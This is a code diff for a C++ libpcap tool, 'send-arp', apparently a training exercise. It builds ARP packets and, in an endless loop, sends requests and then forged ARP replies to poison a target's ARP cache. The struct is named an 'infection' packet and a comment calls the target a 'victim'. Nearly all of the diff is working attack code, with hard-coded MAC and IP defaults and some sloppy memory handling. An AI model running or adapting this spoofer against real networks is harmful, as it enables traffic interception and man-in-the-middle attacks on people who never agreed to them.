@@ -2,6 +2,7 @@
 #include <pcap.h>
 #include "ethhdr.h"
 #include "arphdr.h"
+#include <sys/ioctl.h>
 
 void usage() {
 	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
@@ -13,33 +14,32 @@ typedef struct ARP_INFECTION_PACKET {
 	ARP_HDR arp_h;
 } ARP_PACKET;
 
-void get_my_mac()
-
 void receive_arp(int c, char* sender_ip){
-	
+	ARP_PACKET *packet = new ARP_PACKET;
 }
 
-void send_arp(int c, char* sender_ip, char* target_ip){
-	ARP_PACKET arp_p;
+ARP_PACKET send_arp_preparing(u_int8_t oper,
+	char* src_mac = "9a:12:30:f3:6b:40", char* dst_mac = "ff:ff:ff:ff:ff:ff",
+	char* sender_ip = "192.168.2.35", char* target_ip = "192.168.2.1",
+	char* sender_mac = "9a:12:30:f3:6b:40", char* target_mac = "00:00:00:00:00:00") {
+	ARP_PACKET packet;
 
-	// arp_p.eth_h.ether_dhost = ; /* target mac address, victim 의미 */
-	// arp_p.eth_h.ether_shost = ;	/* my mac address, 내가 보내는거 */
-	// arp_p.eth_h.ether_type = htons(0x0806);
+	memcpy(packet.eth_h.ether_dhost, stringmac_to_bytemac(dst_mac), 6); /* dst_mac */
+	memcpy(packet.eth_h.ether_shost, stringmac_to_bytemac(src_mac), 6); /* src_mac */
+	packet.eth_h.ether_type = htons(0x0806); // ARP protocol
 
-	// arp_p.arp_h.hardware_type = htons(0x0001); /* fixed, 무조건 하드웨어 타입(물리적 주소)은 ethernet, 0x0001 */
-	// arp_p.arp_h.protocol_type = htons(0x8000); /* fixed, 무조건 프로토콜 타입은 ipv4, 0x8000 */
-	// arp_p.arp_h.hardware_length = 0x06;	/* fixed, 무조건 하드웨어 타입(물리적 주소)은 ethernet, 6바이트 */
-	// arp_p.arp_h.protocol_length = 0x04;	/* fixed, 무조건 프로토콜 타입은 ipv4, 4바이트 */
-	// arp_p.arp_h.operation = htons(0x0002);	/* 우리는 응답으로 송신 -> 0x0002 */
-	// arp_p.arp_h.sender_mac_address = '\x00\x00\x00\x00\x00\x00';
-	// arp_p.arp_h.sender_ip_address = htonl(argv[c]);
-	// arp_p.arp_h.target_mac_address = '\x00\x00\x00\x00\x00\x00';
-	// arp_p.arp_h.target_ip_address = htonl(argv[c+1]);
+	packet.arp_h.hardware_type = htons(1); // Ethernet
+	packet.arp_h.protocol_type = htons(0x0800); // IPv4
+	packet.arp_h.hardware_length = 6; // MAC address length
+	packet.arp_h.protocol_length = 4; // IPv4 address length
+	packet.arp_h.operation = htons(oper); // ARP reply
 
-	// int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-	// if (res != 0) {
-	// 	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-	// }
+	memcpy(packet.arp_h.sender_mac_address, stringmac_to_bytemac(sender_mac), 6); // Sender MAC address
+	memcpy(packet.arp_h.sender_ip_address, stringip_to_byteip(sender_ip), 4); // Sender IP address
+	memcpy(packet.arp_h.target_mac_address, stringmac_to_bytemac(target_mac), 6); // Target MAC address
+	memcpy(packet.arp_h.target_ip_address, stringip_to_byteip(target_ip), 4); // Target IP address
+
+	return packet;
 }
 
 int main(int argc, char* argv[]) {
@@ -56,7 +56,50 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
-	
+	while (1){
+		for(int i = 4; i < argc; i += 2) {
+			/* who is <target_ip>? request */
+			ARP_PACKET tip_req_packet = send_arp_preparing(1, "9a:12:30:f3:6b:40", "ff:ff:ff:ff:ff:ff", argv[i],argv[i+1], "9a:12:30:f3:6b:40", "00:00:00:00:00:00"); // ARP request operation
+			if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&tip_req_packet), sizeof(tip_req_packet)) != 0) {
+				fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap));
+				return -1;
+			}
+			printf("Sent ARP request from %s to %s\n", argv[i], argv[i + 1]);
 
+			/* who is <target_ip>? wait and receive */
+			ARP_PACKET* tip_res_packet = nullptr;
+			while (true) {
+				struct pcap_pkthdr* header;
+				const u_char* packet;
+				int res = pcap_next_ex(pcap, &header, &packet);
+				if (res == 0) continue;
+				if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+					printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
+					break;
+				}
+				printf("%u bytes captured\n", header->caplen);
+				/* is arp? */
+				tip_res_packet = reinterpret_cast<ARP_PACKET*>(const_cast<u_char*>(packet));
+				if (ntohs(tip_res_packet->eth_h.ether_type) == 0x0806 && // ARP protocol
+					ntohs(tip_res_packet->arp_h.operation) == 2 && // ARP reply operation
+					memcmp(tip_res_packet->arp_h.target_ip_address, stringip_to_byteip(argv[i + 1]), 4) == 0) {
+					printf("Received ARP reply from %s\n", argv[i + 1]);
+					break;
+				}
+			}
+
+			ARP_PACKET packet = send_arp_preparing(2,
+				bytemac_to_stringmac(tip_res_packet->eth_h.ether_dhost),
+				bytemac_to_stringmac(tip_res_packet->eth_h.ether_shost),
+				argv[i], argv[i+1],
+				bytemac_to_stringmac(tip_res_packet->arp_h.sender_mac_address),
+				bytemac_to_stringmac(tip_res_packet->eth_h.ether_dhost)); // ARP response operation
+			if (pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) != 0) {
+				fprintf(stderr, "send packet error: %s\n", pcap_geterr(pcap));
+				return -1;
+			}
+			printf("Sent ARP packet from %s to %s\n", argv[i], argv[i + 1]);
+		}
+	}
 	pcap_close(pcap);
 }
